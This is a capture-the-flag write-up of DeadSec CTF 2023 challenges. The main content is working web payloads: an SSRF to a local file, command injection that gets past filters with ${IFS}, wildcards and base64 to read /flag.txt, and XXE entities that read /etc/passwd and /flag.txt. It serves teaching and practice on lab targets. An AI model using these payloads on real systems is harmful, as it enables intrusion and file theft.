---
title: DeadSecCTF 2023 - WriteUp
author: V0lk3n
tags: CTF, DeadSecCTF, Web, Enumeration, Welcome, CyberSecurity, XEE
---

# DeadSec CTF 2023 - WriteUp

<p align="center">
	<img src="https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/69188c74-55ab-48a3-b06c-38b32e8ed72d">
	<img src="https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/4f6f6a6d-9092-44de-b406-e3834b06cc84">
</p>

> Written by [V0lk3n](https://twitter.com/V0lk3n)

## Author Note

```
Thanks for this CTF! I didn't get a lot of time to play on it, but honnestly it was a really nice one :)

Note that, i've a bit "over explained" some steps with BurpSuite usage, specially for beginners with this tool.

I hope you will like my WriteUp!

- V0lk3n
```

## Table of Contents

* [Welcome Challenges](#Welcome)
	* 1.0 [Welcome 1](#Welcome1)
	* 2.0 [Welcome 2](#Welcome2)

* [Web Challenges](#Web)
	* 3.0 [FRSS](#FRSS)
	* 4.0 [Bing](#Bing)
	* 5.0 [XXE1](#XXE1)
* [Credits](#Credits)

## Welcome Challenges<a name="Welcome"></a>

## Welcome<a name="Welcome1"></a>

Value : **1pts**

Description :

```
Welcome to DeadSec CTF 2023!

Join Our Discord: [https://discord.gg/SRP4m6Su](https://discord.gg/SRP4m6Su)
```

### Solution

Join the discord server, look at ```#announcement``` channel. You can see the flag approximatively at the time that the CTF started (or in the pinned messages).

![1-Welcome](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/5410ed87-0dfc-4d38-b6a0-53a45f7405b2)

FLAG : **Dead{W3c0me_t0_D3edSec_CTF}**

## Welcome 2<a name="Welcome2"></a>

Value : **50pts**

Author : **onsra**

Description :

```
Greeting each other in General/Welcome discord, you might receive a FLAG or not. 

Format: **Dead{what you find}**
```

### Solution

Looking at the ```#welcome``` channel, on the ```GENERAL``` category. We doesn't see anything that seem relevant. (Excepted if the player try to hint because they already solve it.)

Looking at bot, there is only ```Tickets``` bot.

Looking at the server emoji, and we can find a lot of emoji ```memes```.

![1-Welcome2](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/3889b23d-f6c3-4a4d-8db4-723e74152cd8)

If we look carefully, we can notice the right flag on one of them (Just be lazy, take a screenshot and zoom in).

![2-Welcome2flag](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/f2d561af-9cd6-46a8-8595-524ac076e1be)

Flag : **Dead{deadsec_ctf_hehe_@@!!!}**

## Web Challenges<a name="Web"></a>

## FRSS<a name="FRSS"></a>

Value : **50pts**

Author : **onsra**

Description : 

```
**Url: [https://www.deadsec.xyz/instances/frss](https://www.deadsec.xyz/instances/frss)**
```

### Solution

Once on the challenge page. We notice an URL user input, with a code leak that show us that ```curl``` is used.

![1-Challenge](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/20b29e0d-c6c9-424d-8bce-39a33352c4d8)

Curl as three option :

The two first are made, to only allow redirection to the protocol ```HTTP```, other protocol will not be allowed. 

The thrid is used to make only one redirection.

Let's try to get the content of google.com

```
URL = google.com
```

![2-Google](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/6f7c2d5e-4cdf-4acd-9b1b-232f189180d9)


It seem to work! Now, as our challenge is under the HTTP protocol, what happen if i put the localhost as URL?

```
URL = 127.0.0.1
```

![3-DoubleHome](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/24bfba4e-c37d-4592-80e8-931809ee9ddd)

We got the content of the home page as answer! Great. Now let's try to recover the flag which is located on "hehe.txt".

```
url = 127.0.0.1/hehe.txt
```

![4-TooLong](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/78d38cb9-9b47-4733-b5e9-001421643fcb)

Whoops! Our URL is too long! Let's try to change the localhost format. 

And after few try...

```
URL = 0.0.0.0/hehe.txt
```

![5-Flag](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/c6084649-4b7d-4bc9-a49d-9da49293d9e6)

We got the flag!

> Note : Fun fact. I solved this challenge literally at the timeout of the CTF... 15h00, so i solved it, but not submitted the flag :s

![6-fucked](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/adf7a6b1-b332-46ab-8c3d-a46ebfda81bb)

FLAG : **dead{Ashiiiibaaa_you_hAv3_Pybass_chA11}**

## Bing<a name="Bing"></a>

Value : **50pts**

Author : **onsra**

Description :

```
**Url: [https://www.deadsec.xyz/instances/bing](https://www.deadsec.xyz/instances/bing) **
```

### Solution

Once on the challenge we see this home page.

![1-HomePage](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/51bde532-23f6-4388-b2b0-0ceb17346645)

We can see a page ```Flag for you```, looking at it we see this page.

![2-Flag4You](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/6ed4f77f-9ce2-45c6-b7ad-77c15324f52d)

Apparently, we need to enter an IP address. Let's try some random IP address.

```
127.0.0.1
```

![3-RandomHost](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/7e5d3af3-3453-4db4-9c43-6e2bdbac55be)

We got an error, but apparently we run the command "127.0.0.1", if we really run commands maybe we have code execution here. If we try to bypass it by using the `|` character to escape from the previous command and make another one, we got this result when trying to click the "submit" button.

```
127.0.0.1|whoami
```

![4-NoBypass](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/5ed62a2a-7d59-4431-91c5-4707d94c8cb6)

So we can't actually submit our request because of that verification from the button.

So let's fire burp suite to simply send request without pressing the button.

Follow these step :
```
Open Burp Suite, in the "proxy" tab open the browser. 

On the browser, reech the challenge URL, write any ip address.

Come back to Burp Suite and press "Intercept On" button.

Come back to the browser and submit the request by pressing the "submit" button.

Come back to Burp Suite, it should have intercepted the request.
```

![5-BurpIntercept](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/f33f3d6b-f5d6-4339-b0b2-fb2512257296)


Now on ```Action``` send the request to the ```repeater```.

![6-ToRepeater](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/5b564283-f3fe-4a55-ac86-03dea22f37a3)

Now let's try our bypass again. We will put the character ```"|"``` right after the ip address, to add another command which should be executed.

```
127.0.0.1|whoami
```

![7-Bypass](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/bb424c66-1701-4ae8-b1d2-7f3bed09c871)

It work! Now let's try to liste files and directory.

```
127.0.0.1|whoami|ls
```

![8-NoLS](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/7972fcd4-d2a6-48b9-a549-9fc851934e66)

Huh... Oh-oh, there is some protections. Apparently we can't use ```ls``` command. Let's try to use another way to list files and directory using ```dir```.

```
127.0.0.1|whoami|dir
```

![9-Dir](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/ecb8d2e4-700e-4e9a-a2de-c01a860adb06)


Great! But as you can see, it show only our new command and forgot the previous one.
Let's try to change our bypass character by using the character ```";"``` this time.

```
127.0.0.1;whoami;dir
```

![10-ChangeBypassMethod](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/ab328db3-9a68-4cbe-a083-8bb1e69491d1)


Nice, let's move on. We will try to list "all" the files and directory with ```dir -a```. But of course, with a space it will be hard.

```
127.0.0.1;whoami;dir -a
```

![11-NoSpace](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/4101c37a-775b-4c2e-97ef-d18d215ef6d6)


Trying to URL encode doesnt work. So let's try to find another way to bypass forbidden space. You can refere to the source bellow.

Source : https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces

By using the characters ```${IFS}``` we can make space in our request. If you need more informations about what is ```IFS``` you can look at the source bellow.

Source : https://unix.stackexchange.com/questions/26784/understanding-ifs

```
127.0.0.1;whoami;dir${IFS}-a
```

![11-YeahSpace](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/0be270b8-7d7e-404b-90ee-5daf66ab35fa)

Great so now that we enumerate all the files and directory, we doesn't find the flag there, so let's look at the base of the machine.

```
127.0.0.1;whoami;dir${IFS}-a${IFS}/
```

![12-LocateFlag](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/3c37352d-0be5-4de5-81b0-8e970f8e8266)

Great we find the flag! Let's try to read it. But first, we will try to read the ```requirements.txt``` which is at our location, to be sure that it work, because maybe there are additionnal protection on the ```flag.txt``` file.

```
127.0.0.1;whoami;dir${IFS}-a;cat${IFS}requirements.txt
```

![13-NoCat](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/3b444824-8c25-4784-80a1-06def473b820)


Oh no... Apparently we can't use ```cat``` to read files. Let's try with ```more``` as alternative.

```
127.0.0.1;whoami;dir${IFS}-a;more${IFS}requirements.txt
```

![14-MOAARE](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/1ec360f8-e5b7-4b65-a1b1-6572f7e2d429)

Great!

Now let's try to read the flag.

```
127.0.0.1;whoami;dir${IFS}-a$;more${IFS}/flag.txt
```
![15-CantRead](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/058a8b98-2a55-4ab2-a4a7-57aecfbe03ca)


ARGH! Apparently, there is some protection. At this moment we need to think, what kind of protection can be there... First think that i was thinking is, maybe we arent allowed to type "flag.txt". So how can i specify this file without giving the full name?

If you know, you know! And if you didn't, i dont really know which ressource to give. But you need to know that in bash you can specify "?" character to guess some letter if you provide some of them.

Here is an example using "/bin/whoami"

![IMAGE_BONUS](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/11f502a5-27be-4c73-b081-2bccabf78a80)

Now let's try on our target flag.

```
127.0.0.1;whoami;dir${IFS}-a;more${IFS}/fl?g.txt
```

![16-CanREAD](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/fbb59b72-d8d9-48b7-a56b-ea54f281126c)

Great!! It forgot all our previous output, and told us that we can read the flag!! So apparently we got the right methode. Now apparently, reading the flag return the output saying that we can read it. Why? Maybe because the application told that if you read the flag, it will not print the content but return that, yes you can read it.

So how bypass it? Let's see if we can use ```base64``` to encode the flag.

```
127.0.0.1;whoami;dir${IFS}-a;base64${IFS}--help
```

![17-Base64](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/9e45cf6f-d4d2-4d2a-9593-757e673310f3)

Perfect! Now let's encode the flag.


```
127.0.0.1;whoami;dir${IFS}-a;base64${IFS}/flag.txt
```

![18-FlagEncoded](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/0cb05217-63b7-4132-a3c7-c184d6fe7b6d)


Good we get the ```base64```, on Burp, in the "Response" part, you can swith to ```Raw``` view to select the base64.

```base64
ZGVhZHtva29rb2shISFfdGgxc19mbEFnX2YwUl9ZMFV9Cg==
```

![19-RAWWR](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/3414afd8-909b-4a89-84b4-e2efbd953af1)


Now at the rigth you should have the ```base64``` auto decoded, if not, you can simply right click on the base64 strings, click on "send to decoder" and then on the "decoder" tab, decode it from base64 to ascii.

![20-Flag](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/3e0f38f1-d775-4b71-9b8a-6ac15e6c71b0)

FLAG : **dead{okokok!!!_th1s_flAg_f0R_Y0U}**

## XXE1<a name="XXE1"></a>

Value : **50pts**

Author : **onsra**

Description :

```
flag in flag.txt

**Url: [https://www.deadsec.xyz/instances/xee1](https://www.deadsec.xyz/instances/xee1)**
```

### Solution

Once on the challenge page, we seen a login form. Trying to authenticate as ```admin:admin``` work.

![1-LoggedAdmin](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/c9a38796-90bb-4399-920e-c223b7e84245)

As the name said, there should be an XML Eternal Entity vulnerability somewhere. So let's run Burp Suite, go to the "Proxy" tab, open a browser, and intercept the login request.

![2-LoggedAdminRequest](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/174f4c50-c7cc-4138-bab2-78d339968958)

Now let's try to exploit the XSS to read ```/etc/passwd``` file, by using our "admin" username as entity.

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<user>
	<username>&xxe;</username>
	<password>admin</password>
</user>
```

![3-ExploitXSS](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/5d0178b8-d0d5-458c-8f9d-79afb8cb2a52)


Great! We successfully exploited it! Now let's read our flag.

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///flag.txt"> ]>

<user>
	<username>&xxe;</username>
	<password>admin</password>
</user>
```

![4-CantRead](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/8fce169d-29b9-4014-b9c8-f027972241f7)

Oh. We are not allowed to read it... So how to retrieve it, whithout reading it? By encoding and then decoding it!

Let's encode it using base64!

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt"> ]>

<user>
	<username>&xxe;</username>
	<password>admin</password>
</user>
```

![5-Flag](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/61970496-070b-4454-bd4d-8d40f64561c7)

Great it work! We encoded the flag in base64, and once selected, Burp decode it and we got the flag!!

> Note : If its not the case, send the selected base64 to decoder by right clicking on it, and then, decode it as base64 to ASCII.


Flag : **dead{n1ce_br0_XE3_3z_h3h3}**

## Credits<a name="Credits"></a>


Special thanks to :

* **[DeadSecCTF](https://ctftime.org/event/1962/)** - team for the CTF!
* **onsra** - for the Challenges creation!
 
And of course... 

**Thanks to my team [Godzillhack!](https://godzillhack.com)**

<p align="center">
	<img src="https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/991200b0-e767-4bc7-8dc3-fecb22825b57">
</p>
